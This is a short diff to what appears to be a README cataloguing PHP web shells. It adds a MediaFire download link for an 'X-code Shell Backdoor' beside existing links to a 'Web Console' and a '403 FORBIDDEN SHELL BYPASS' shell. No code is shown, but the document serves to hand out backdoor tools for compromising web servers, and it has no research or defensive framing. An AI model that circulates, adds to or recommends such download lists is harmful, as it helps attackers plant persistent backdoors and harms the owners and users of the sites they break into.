@@ -492,6 +492,9 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 
 # <a href="https://www.mediafire.com/file/llbt4f48wqz6hv1/web-console.php/file">Web Console</a> 
 <img src="https://i.imgur.com/HuuLSCw.png" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/2z4thcsprlhhss5/xcode.php/file">X-code Shell Backdoor</a> 
+<img src="https://i.imgur.com/XJ2P7vz.png" alt="beruangsalju profile">
 	
 # <a href="https://www.mediafire.com/file/uc6b2sx6zw3ciar/403.php/file">403 FORBIDDEN SHELL BYPASS</a> 
 <img src="https://i.imgur.com/nsKzWeb.jpg" alt="beruangsalju profile">
